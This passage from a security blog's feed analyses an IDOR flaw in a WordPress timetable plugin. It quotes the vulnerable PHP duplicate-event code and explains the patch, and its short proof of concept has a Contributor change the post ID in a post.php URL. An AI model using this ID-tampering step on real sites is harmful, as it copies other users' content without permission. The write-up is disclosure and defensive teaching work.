2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Timetable and Event Schedule&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.15&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt; * &lt;code&gt;2.4.16&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin has registered an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;post_action_mptt_duplicate_event&amp;#39;, array( $this-&amp;gt;get( &amp;#39;events&amp;#39; ), &amp;#39;post_action_mptt_duplicate_event&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;strong&gt;WordPress&lt;/strong&gt;, hooks with the &lt;code&gt;post_action_&lt;/code&gt; prefix are special hooks used to handle actions passed via the &lt;code&gt;action&lt;/code&gt; parameter when accessing the &lt;code&gt;post.php&lt;/code&gt; file.&#xA;Specifically, when a user accesses a URL like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/post.php?post=post_id&amp;amp;action=mptt_duplicate_event&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress will call the &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; callback to process the &lt;strong&gt;duplicate event&lt;/strong&gt; logic.&lt;/p&gt;&#xA;&lt;p&gt;In addition to registering the action hook, the plugin also &lt;strong&gt;proactively creates a URL to trigger this action&lt;/strong&gt; by adding a &amp;ldquo;Duplicate&amp;rdquo; link to the action list of each post in the admin dashboard.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_row_actions( $actions, $post ) {&#xA;    if ( $post-&amp;gt;post_type == $this-&amp;gt;post_type &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $action_url = add_query_arg(&#xA;            array(&#xA;                &amp;#39;post&amp;#39; =&amp;gt; $post-&amp;gt;ID,&#xA;                &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;mptt_duplicate_event&amp;#39;,&#xA;                &amp;#39;_wpnonce&amp;#39; =&amp;gt; wp_create_nonce( &amp;#39;mptt_duplicate_event&amp;#39; )&#xA;            ),&#xA;            admin_url( &amp;#39;post.php&amp;#39; )&#xA;        );&#xA;&#xA;        $actions[&amp;#39;duplicate&amp;#39;] = &amp;#39;&amp;lt;a href=&amp;#34;&amp;#39; . $action_url . &amp;#39;&amp;#34; aria-label=&amp;#34;&amp;#39; .&#xA;            __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;#34; rel=&amp;#34;permalink&amp;#34;&amp;gt;&amp;#39; . __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;lt;/a&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    return $actions;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function uses the &lt;code&gt;post_row_actions&lt;/code&gt; hook to &lt;strong&gt;add a Duplicate link&lt;/strong&gt; to the action list of each post in the admin.&lt;/p&gt;&#xA;&lt;p&gt;The link is only displayed when the post matches the correct &lt;code&gt;post_type&lt;/code&gt; and the user has &lt;code&gt;edit_posts&lt;/code&gt; permissions (Contributor+).&#xA;The generated URL points to &lt;code&gt;post.php&lt;/code&gt; with &lt;code&gt;post&lt;/code&gt; (Post ID), &lt;code&gt;action&lt;/code&gt; (&lt;code&gt;mptt_duplicate_event&lt;/code&gt;), and &lt;code&gt;_wpnonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;When a user clicks &lt;strong&gt;Duplicate&lt;/strong&gt;, WordPress will trigger the &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; hook to process post duplication.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; title=&#34;Duplicate link in each Event&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; data-sub-html=&#34;&lt;h2&gt;Duplicate&lt;/h2&gt;&lt;p&gt;Duplicate link in each Event&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#39; alt=&#34;Duplicate&#34; height=&#34;483&#34; width=&#34;875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Duplicate link in each Event&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_action_mptt_duplicate_event( $post_id ) {&#xA;    global $wpdb;&#xA;&#xA;    $post_type = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $post_id ) {&#xA;        $post = get_post( $post_id );&#xA;    }&#xA;&#xA;    if ( $post ) {&#xA;        $post_type = $post-&amp;gt;post_type;&#xA;    }&#xA;&#xA;    if ( $post_type !== $this-&amp;gt;post_type ) {&#xA;        wp_die( __( &amp;#39;A post type mismatch has been detected.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    $nonce = sanitize_key( $_REQUEST[&amp;#39;_wpnonce&amp;#39;] );&#xA;&#xA;    if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $current_user = wp_get_current_user();&#xA;        $new_post_author = $current_user-&amp;gt;ID;&#xA;&#xA;        /*&#xA;            * new post data array&#xA;            */&#xA;        $args = array(&#xA;            &amp;#39;comment_status&amp;#39; =&amp;gt; $post-&amp;gt;comment_status,&#xA;            &amp;#39;ping_status&amp;#39;    =&amp;gt; $post-&amp;gt;ping_status,&#xA;            &amp;#39;post_author&amp;#39;    =&amp;gt; $new_post_author,&#xA;            &amp;#39;post_content&amp;#39;   =&amp;gt; $post-&amp;gt;post_content,&#xA;            &amp;#39;post_excerpt&amp;#39;   =&amp;gt; $post-&amp;gt;post_excerpt,&#xA;            &amp;#39;post_name&amp;#39;      =&amp;gt; $post-&amp;gt;post_name,&#xA;            &amp;#39;post_parent&amp;#39;    =&amp;gt; $post-&amp;gt;post_parent,&#xA;            &amp;#39;post_password&amp;#39;  =&amp;gt; $post-&amp;gt;post_password,&#xA;            &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;draft&amp;#39;,&#xA;            // translators: New post title of the duplicated post&#xA;            &amp;#39;post_title&amp;#39;     =&amp;gt; sprintf( __(&amp;#39;%s - Copy&amp;#39;, &amp;#39;mp-timetable&amp;#39;), $post-&amp;gt;post_title ),&#xA;            &amp;#39;post_type&amp;#39;      =&amp;gt; $post-&amp;gt;post_type,&#xA;            &amp;#39;to_ping&amp;#39;        =&amp;gt; $post-&amp;gt;to_ping,&#xA;            &amp;#39;menu_order&amp;#39;     =&amp;gt; $post-&amp;gt;menu_order&#xA;        );&#xA;&#xA;        /*&#xA;            * insert the post by wp_insert_post() function&#xA;            */&#xA;        $new_post_id = wp_insert_post( $args );&#xA;&#xA;        if( is_wp_error($new_post_id) ) {&#xA;            wp_die( $post_id-&amp;gt;get_error_message() );&#xA;        }&#xA;&#xA;        /*&#xA;            * get all current post terms and set them to the new post draft&#xA;            */&#xA;        $taxonomies = get_object_taxonomies($post-&amp;gt;post_type);&#xA;        foreach ($taxonomies as $taxonomy) {&#xA;            $post_terms = wp_get_object_terms($post_id, $taxonomy, array(&amp;#39;fields&amp;#39; =&amp;gt; &amp;#39;slugs&amp;#39;));&#xA;            wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate all post meta&#xA;            */&#xA;        $post_meta_keys = \get_post_custom_keys( $post_id );&#xA;&#xA;        if ( ! empty( $post_meta_keys ) ) {&#xA;&#xA;            $meta_excludelist = [&#xA;                &amp;#39;_edit_lock&amp;#39;,&#xA;                &amp;#39;_edit_last&amp;#39;,&#xA;                &amp;#39;_wp_old_slug&amp;#39;&#xA;            ];&#xA;&#xA;            $meta_keys = \array_diff( $post_meta_keys, $meta_excludelist );&#xA;&#xA;            foreach ( $meta_keys as $meta_key ) {&#xA;                $meta_values = \get_post_custom_values( $meta_key, $post_id );&#xA;&#xA;                // Clear existing meta data&#xA;                \delete_post_meta( $new_post_id, $meta_key );&#xA;&#xA;                foreach ( $meta_values as $meta_value ) {&#xA;                    $meta_value = \maybe_unserialize( $meta_value );&#xA;                    \add_post_meta( $new_post_id, $meta_key, addslashes( $meta_value ) );&#xA;                }&#xA;            }&#xA;&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate timeslots in custom BD&#xA;            */&#xA;        $timeslots = $this-&amp;gt;wpdb-&amp;gt;get_results( &#xA;            $this-&amp;gt;wpdb-&amp;gt;prepare(&amp;#34;SELECT * FROM {$this-&amp;gt;table_name} WHERE event_id = %d&amp;#34;, $post_id ), &#xA;        OBJECT );&#xA;&#xA;        if ( !empty($timeslots) ) {&#xA;&#xA;            foreach ( $timeslots as $timeslot ) {&#xA;                $wpdb-&amp;gt;insert(&#xA;                    $this-&amp;gt;table_name,&#xA;                    array(&#xA;                        &amp;#39;column_id&amp;#39;   =&amp;gt; $timeslot-&amp;gt;column_id,&#xA;                        &amp;#39;event_id&amp;#39;    =&amp;gt; $new_post_id,&#xA;                        &amp;#39;event_start&amp;#39; =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_start ) ),&#xA;                        &amp;#39;event_end&amp;#39;   =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_end ) ),&#xA;                        &amp;#39;user_id&amp;#39;     =&amp;gt; $timeslot-&amp;gt;user_id,&#xA;                        &amp;#39;description&amp;#39; =&amp;gt; $timeslot-&amp;gt;description&#xA;                    )&#xA;                );&#xA;            }&#xA;        }&#xA;&#xA;        /*&#xA;            * redirect to the edit post screen for the new draft&#xA;            */&#xA;        wp_safe_redirect( get_edit_post_link( $new_post_id, &amp;#39;&amp;#39; ) );&#xA;        exit();&#xA;&#xA;    } else {&#xA;        wp_die( __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function performs the duplication of the post with ID &lt;code&gt;$post_id&lt;/code&gt;, however:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the main cause leading to IDOR (Insecure Direct Object Reference).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; is a &lt;strong&gt;generic&lt;/strong&gt; permission, not attached to a &lt;strong&gt;specific post&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Contributors and above all have this permission.&lt;/li&gt;&#xA;&lt;li&gt;There is no check for:&lt;/li&gt;&#xA;&lt;li&gt;whether the post belongs to the current user&lt;/li&gt;&#xA;&lt;li&gt;whether the user has permission to edit the &lt;strong&gt;specific post_id&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post = get_post( $post_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The post is retrieved directly from &lt;code&gt;$post_id&lt;/code&gt; passed via URL &lt;strong&gt;without ownership restrictions&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;post.php?action=mptt_duplicate_event&amp;amp;post=123&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Just by guessing or changing the &lt;code&gt;post&lt;/code&gt; ID in the URL, a user with &lt;code&gt;edit_posts&lt;/code&gt; can still:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;duplicate someone else&amp;rsquo;s post&lt;/li&gt;&#xA;&lt;li&gt;duplicate a published post&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Because WordPress &lt;strong&gt;does not automatically check permissions in the &lt;code&gt;post_action_*&lt;/code&gt; hook&lt;/strong&gt;, the entire access control depends on the &lt;code&gt;current_user_can()&lt;/code&gt; snippet in the plugin.&lt;/p&gt;&#xA;&lt;p&gt;Instead of using &lt;code&gt;edit_posts&lt;/code&gt;, the patch switched to checking permissions on each specific object using meta capability:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;edit_post&amp;#39;, $post_id )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This check forces WordPress to verify:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Whether the user has permission to edit the post referenced by &lt;code&gt;$post_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Whether the post belongs to the current user&lt;/li&gt;&#xA;&lt;li&gt;The post status (draft, pending, published, private)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Thanks to this, users can no longer arbitrarily change the post ID in the URL to duplicate someone else&amp;rsquo;s post, and the &lt;strong&gt;IDOR&lt;/strong&gt; vulnerability is fixed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#34; title=&#34;The patch changes&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;The patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#39; alt=&#34;Diff&#34; height=&#34;679&#34; width=&#34;1788&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;The patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Authenticated user (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Duplicate link or craft URL manually&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Request: /wp-admin/post.php?action=mptt_duplicate_event&amp;amp;post={target_post_id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;WordPress loads post.php&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;do_action(&amp;#39;post_action_mptt_duplicate_event&amp;#39;, post_id)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;post_action_mptt_duplicate_event(post_id)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post(post_id) without ownership check&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check nonce &amp;#43; current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Permission granted (generic capability)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Duplicate target post (content, meta, taxonomy, custom table)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Create new draft owned by attacker&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to edit screen of duplicated post&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with a Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Access &lt;code&gt;Timetable&lt;/code&gt; &amp;gt; &lt;code&gt;Events&lt;/code&gt; and click &lt;code&gt;Duplicate&lt;/code&gt; on any event&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#34; title=&#34;PoC&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/poc.gif&#34; data-sub-html=&#34;&lt;h2&gt;PoC&lt;/h2&gt;&lt;p&gt;PoC&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#39; alt=&#34;PoC&#34; height=&#34;644&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PoC&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability stems from the plugin only checking the general &lt;code&gt;edit_posts&lt;/code&gt; permission when duplicating an event, instead of checking permissions on the &lt;strong&gt;specific post&lt;/strong&gt;. Since the &lt;code&gt;post_action_*&lt;/code&gt; hook is not automatically protected by WordPress, low-privileged users (Contributors) can change the &lt;code&gt;post&lt;/code&gt; ID in the URL to duplicate events they do not own, leading to IDOR. The patch fixes this by using the &lt;code&gt;edit_post&lt;/code&gt; meta capability, forcing WordPress to verify permissions on each post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; is not suitable for protecting operations on specific posts&lt;/li&gt;&#xA;&lt;li&gt;Nonce is not a substitute for permission checks&lt;/li&gt;&#xA;&lt;li&gt;IDs taken from requests are always user-controlled&lt;/li&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt; when operating on a post&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;post_action_*&lt;/code&gt; hook requires the plugin to control authorization itself&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mp-timetable/vulnerability/wordpress-timetable-and-event-schedule-plugin-2-4-16-contributor-event-disclosure-via-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin &amp;lt;= 2.4.15 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;&#xA;</description>
    </item>
    <item>
      <title>CVE-2025-67985 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-20-cve-2025-67985/</link>
      <pubDate>Sat, 20 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-20-cve-2025-67985/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
